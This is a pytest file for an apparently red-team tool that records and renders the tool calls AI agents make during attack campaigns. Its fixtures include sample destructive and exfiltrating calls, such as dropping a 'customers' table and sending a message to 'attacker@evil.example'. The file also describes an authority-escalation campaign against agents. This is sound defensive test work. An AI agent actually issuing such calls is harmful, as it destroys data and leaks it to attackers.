"""Tests for the tool-call evidence pipeline (#5 — trace observability).

The TargetAdapter layer extracts tool_calls from the target's
response. The campaign engine now persists them onto each Turn so:
  * the LLM judge can verdict on tool-layer evidence, not just chat
  * the merger can render a per-turn "tools invoked" chip strip
  * downstream consumers (SARIF, JSON) get structured tool data

Covers:
  * Turn dataclass has tool_calls field
  * run_campaign passes adapter response.tool_calls into the Turn
  * write_campaign_findings serializes tool_calls to JSON
  * Renderer surfaces a chip strip with destructive verbs tinted red
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from agentshield.probe.campaign import (
    MOCK_CAMPAIGN_CATALOGUE,
    CampaignFinding,
    Turn,
    run_campaign,
    write_campaign_findings,
)
from agentshield.probe.target_adapter import (
    TargetRequest,
    TargetResponse,
)


# ---------- shape ----------


def test_turn_has_tool_calls_field_defaulting_empty() -> None:
    t = Turn(
        index=1, logical_turn=1, attempt=1,
        attacker_message="m", target_response="r",
        indicators_matched=(), verdict="advanced",
        reasoning="t", elapsed_ms=1,
    )
    assert t.tool_calls == ()


def test_turn_accepts_tool_calls_tuple() -> None:
    t = Turn(
        index=1, logical_turn=1, attempt=1,
        attacker_message="m", target_response="r",
        indicators_matched=(), verdict="succeeded",
        reasoning="t", elapsed_ms=1,
        tool_calls=({"name": "drop_table"},),
    )
    assert t.tool_calls == ({"name": "drop_table"},)


# ---------- adapter -> campaign plumbing ----------


class _FixedAdapter:
    """Stub adapter that returns a canned response every call —
    lets us assert tool_calls flow through run_campaign without
    needing a live HTTP target."""

    name = "fixed-test"

    def __init__(self, tool_calls: tuple[dict, ...]) -> None:
        self._tool_calls = tool_calls

    def send_turn(self, request: TargetRequest) -> TargetResponse:
        return TargetResponse(
            reply_text="canned reply",
            raw_body=json.dumps({
                "reply": "canned reply",
                "tool_calls": list(self._tool_calls),
            }),
            tool_calls=self._tool_calls,
            elapsed_ms=1,
            http_status=200,
        )

    def discover_metadata(self):
        from agentshield.probe.target_adapter import AgentMetadata
        return AgentMetadata()


def test_run_campaign_copies_tool_calls_onto_turn_records() -> None:
    """The simplest campaign in the catalogue, fired through a stub
    adapter whose response carries tool_calls — assert the Turn
    records preserve them."""
    objective = next(
        c for c in MOCK_CAMPAIGN_CATALOGUE
        if c.name == "authority-escalation-destructive-action"
    )
    adapter = _FixedAdapter(
        tool_calls=({"name": "drop_table", "args": {"table": "customers"}},),
    )
    finding = run_campaign(
        objective,
        adapter=adapter,
        target_url="http://fake/api",
    )
    assert finding.turns, "campaign should have at least one turn"
    # Every turn that actually fired sees the stub's tool_calls.
    for t in finding.turns:
        assert t.tool_calls == (
            {"name": "drop_table", "args": {"table": "customers"}},
        )


def test_write_campaign_findings_serializes_tool_calls(
    tmp_path: Path,
) -> None:
    """Writer round-trip: tool_calls on each Turn must survive to
    JSON so the merger + judge can read them on the next run."""
    finding = CampaignFinding(
        rule_id="redteam-campaign-test",
        agentshield_id="AS-RT-D-001",
        name="test",
        title="Test",
        category="detect",
        severity="high",
        objective="test",
        rationale="test",
        status="succeeded",
        confidence=0.8,
        turn_count=1,
        target="http://test",
        session_ids=("s1",),
        discovered_at="2026-05-20T00:00:00Z",
        turns=(
            Turn(
                index=1, logical_turn=1, attempt=1,
                attacker_message="m", target_response="r",
                indicators_matched=(),
                verdict="succeeded", reasoning="t", elapsed_ms=1,
                tool_calls=(
                    {"name": "send_message",
                     "args": {"to": "attacker@evil.example"}},
                    {"name": "list_invoices"},
                ),
            ),
        ),
    )
    out_path = write_campaign_findings([finding], tmp_path)
    written = json.loads(out_path.read_text())
    turn = written["campaigns"][0]["turns"][0]
    assert turn["tool_calls"] == [
        {"name": "send_message",
         "args": {"to": "attacker@evil.example"}},
        {"name": "list_invoices"},
    ]


# ---------- renderer ----------


def _build_minimal_report(
    tmp_path: Path,
    *,
    tool_calls: list[dict],
) -> str:
    """Spin up a minimal merge-able .agentshield/ with one campaign
    whose lone turn carries the given tool_calls, then render."""
    from agentshield.merger import merge, render_combined_html

    base = tmp_path / ".agentshield"
    base.mkdir()
    (base / "tier1-results.json").write_text(json.dumps({
        "tier": 1, "scanned_at": "2026-05-20T00:00:00Z",
        "agentshield_tier1_fingerprint": "abc",
        "scanned_files": [], "findings": [],
    }))
    (base / "tier2-findings.json").write_text(json.dumps({
        "tier": 2, "scanned_at": "2026-05-20T00:01:00Z",
        "agentshield_tier1_fingerprint": "abc",
        "scanned_files": [], "skipped_files": [], "findings": [],
        "tier1_fp_callouts": [],
    }))
    (base / "probe-campaigns.json").write_text(json.dumps({
        "campaigns": [{
            "rule_id": "redteam-campaign-test",
            "agentshield_id": "AS-RT-D-001",
            "name": "test", "title": "Test campaign",
            "category": "detect", "severity": "high",
            "objective": "test", "rationale": "test",
            "status": "succeeded", "confidence": 0.8, "turn_count": 1,
            "target": "http://test", "session_ids": ["s1"],
            "discovered_at": "2026-05-20T00:00:00Z",
            "frameworks": {"owasp_llm": ["LLM01"], "owasp_agentic": [],
                           "mitre_atlas": [], "cwe": [], "ast": []},
            "turns": [{
                "index": 1, "logical_turn": 1, "attempt": 1,
                "attacker_message": "m", "target_response": "r",
                "indicators_matched": [], "verdict": "succeeded",
                "reasoning": "h", "elapsed_ms": 1,
                "tactic": "", "atlas_technique": "",
                "tool_calls": tool_calls,
            }],
        }],
    }))
    return render_combined_html(merge(tmp_path))


def test_render_omits_chip_strip_when_no_tool_calls(
    tmp_path: Path,
) -> None:
    html = _build_minimal_report(tmp_path, tool_calls=[])
    # Strip the <style> block so we don't false-positive on the CSS
    # rule definitions for .rt-turn-tools.
    import re
    body = re.sub(
        r"<style[^>]*>.*?</style>", "", html,
        flags=re.IGNORECASE | re.DOTALL,
    )
    assert 'class="rt-turn-tools"' not in body
    assert "tools invoked" not in body


def test_render_emits_chip_for_each_distinct_tool_name(
    tmp_path: Path,
) -> None:
    html = _build_minimal_report(tmp_path, tool_calls=[
        {"name": "list_invoices"},
        {"name": "send_message", "args": {"to": "x@y.com"}},
    ])
    assert 'class="rt-turn-tools"' in html
    assert "list_invoices" in html
    assert "send_message" in html
    assert "tools invoked" in html


def test_render_collapses_duplicate_tool_names_with_count(
    tmp_path: Path,
) -> None:
    """Same tool fired 3 times on one turn → one chip with `×3`."""
    html = _build_minimal_report(tmp_path, tool_calls=[
        {"name": "search"},
        {"name": "search"},
        {"name": "search"},
    ])
    # The chip itself + a count badge.
    assert "search" in html
    assert "&times;3" in html or "×3" in html


def test_render_tints_destructive_tools_red(tmp_path: Path) -> None:
    """drop_table, send_message, memory_write etc. get the
    rt-tool-chip-destructive class so reviewers' eyes catch them."""
    html = _build_minimal_report(tmp_path, tool_calls=[
        {"name": "drop_table"},
        {"name": "list_invoices"},  # not destructive
    ])
    # The destructive class appears at least once.
    assert "rt-tool-chip-destructive" in html
    # And the non-destructive name does NOT carry the destructive
    # class in its chip span. Verify by checking the substring
    # immediately after the list_invoices chip name doesn't have
    # the destructive class — sufficient since we use a single
    # class on each chip.
    list_idx = html.find(">list_invoices<")
    assert list_idx > 0
    # Look backwards within ~120 chars to find the opening span.
    preceding = html[max(0, list_idx - 200):list_idx]
    last_span = preceding.rfind("<span")
    assert last_span >= 0
    chip_open = preceding[last_span:]
    assert "rt-tool-chip-destructive" not in chip_open
